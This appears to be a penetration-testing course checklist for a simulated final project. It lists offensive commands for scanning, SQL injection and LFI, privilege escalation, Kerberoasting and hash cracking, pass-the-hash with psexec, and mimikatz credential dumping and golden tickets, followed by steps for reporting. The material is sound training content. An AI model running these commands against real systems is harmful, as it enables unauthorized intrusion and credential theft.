# Module 20: Final Project Command Checklist

Use this as a "Cheat Sheet" during your final simulation.

### Step 1: Entry
- [ ] `nmap -sS -sV -O <target>`
- [ ] `gobuster dir -u <url> -w common.txt`
- [ ] `sqlmap -u <url> --dbs` or `php://filter` (LFI)

### Step 2: PrivEsc
- [ ] `sudo -l` or `find / -perm -4000`
- [ ] `linpeas.sh` or `winpeas.exe`
- [ ] `gtfobins.github.io`

### Step 3: Lateral Movement
- [ ] `impacket-GetUserSPNs -dc-ip <ip> -request`
- [ ] `hashcat -m 13100 <hash> rockyou.txt`
- [ ] `impacket-psexec -hashes :<hash> admin@<ip>`

### Step 4: Domain Admin
- [ ] `SharpHound.exe -c All`
- [ ] `mimikatz "privilege::debug" "sekurlsa::logonpasswords"`
- [ ] `kerberos::golden`

### Step 5: Reporting
- [ ] Capture screenshots of every successful command.
- [ ] Save all output logs to `/evidence/`.
- [ ] Draft the report in Markdown or Word.
